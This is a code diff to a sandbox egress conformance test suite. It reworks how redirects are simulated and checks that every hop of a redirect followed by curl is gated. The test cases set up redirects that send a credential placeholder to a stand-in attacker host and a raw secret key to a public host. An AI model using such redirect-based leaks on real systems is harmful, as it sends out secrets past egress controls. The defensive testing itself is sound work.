@@ -187,6 +187,8 @@ async function world(canary: string) {
 		sessions: { get: async (_ctx: CallContext, id: string) => sessions[id] as SessionRecord },
 	});
 	const placeholders = new Map<string, string>();
+	/** Where `/redirect/<name>` on a public host sends the shell. */
+	const redirects = new Map<string, string>();
 	for (const record of Object.values(sessions)) {
 		const usable = await connections.usable(SYSTEM, {
 			organisationId: ORG,
@@ -198,10 +200,11 @@ async function world(canary: string) {
 		for (const each of usable) if (each.placeholder !== undefined) placeholders.set(each.id, each.placeholder);
 	}
 	const shellUpstream: ConformanceShellFetch = async (url, options = {}) => {
-		// `/redirect?to=…` sends the shell on, as any public page may.
+		// `/redirect/<name>` sends the shell on to where the case set it, as any public page may: the target is the
+		// server's, never in the first request.
 		const parsed = new URL(url);
-		const to = parsed.pathname === "/redirect" ? parsed.searchParams.get("to") : null;
-		if (to !== null) {
+		const to = parsed.pathname.startsWith("/redirect/") ? redirects.get(parsed.pathname.slice(10)) : undefined;
+		if (to !== undefined) {
 			upstream.push({ via: "pass", method: (options.method ?? "GET").toUpperCase(), url, headers: {}, body: "" });
 			return {
 				status: 302,
@@ -238,6 +241,7 @@ async function world(canary: string) {
 		events,
 		egress,
 		shellUpstream,
+		redirects,
 		ids: { acme: acme.id, forms: forms.id, canary: planted.id, oauth: oauthId },
 		placeholder,
 	};
@@ -462,17 +466,19 @@ export function registerSandboxEgressConformance(
 		it("puts every hop of a followed redirect to the gate", async () => {
 			await withTarget(async (w, target) => {
 				const ph = w.placeholder(w.ids.acme);
-				const to = encodeURIComponent(`https://evil.example/?k=${ph}`);
-				const bounced = await target.run("ses_shared", `curl -s -L "https://example.org/redirect?to=${to}"`);
+				w.redirects.set("bounce", `https://evil.example/?k=${ph}`);
+				w.redirects.set("leak", `https://example.org/data?k=${ACME_KEY}`);
+				w.redirects.set("clean", "https://example.org/data");
+				const bounced = await target.run("ses_shared", "curl -s -L https://example.org/redirect/bounce");
 				expect(refusalOf(bounced.stdout)).toMatchObject({ error: "host_not_bound" });
-				const raw = encodeURIComponent(`https://example.org/data?k=${ACME_KEY}`);
-				const leaked = await target.run("ses_shared", `curl -s -L "https://example.org/redirect?to=${raw}"`);
+				const leaked = await target.run("ses_shared", "curl -s -L https://example.org/redirect/leak");
 				expect(refusalOf(leaked.stdout)).toMatchObject({ error: "raw_secret" });
+				// Each first hop went out (nothing in it); neither second did.
+				expect(w.upstream.filter((each) => each.url.includes("/redirect/")).length).toBe(2);
 				expect(w.upstream.some((each) => each.url.startsWith("https://evil.example"))).toBe(false);
 				expect(w.upstream.some((each) => each.url.includes(ACME_KEY))).toBe(false);
 				// A clean redirect is followed as before.
-				const clean = encodeURIComponent("https://example.org/data");
-				const followed = await target.run("ses_shared", `curl -s -L "https://example.org/redirect?to=${clean}"`);
+				const followed = await target.run("ses_shared", "curl -s -L https://example.org/redirect/clean");
 				expect(followed.exitCode).toBe(0);
 				expect(w.upstream.at(-1)).toMatchObject({ via: "pass", url: "https://example.org/data" });
 			});
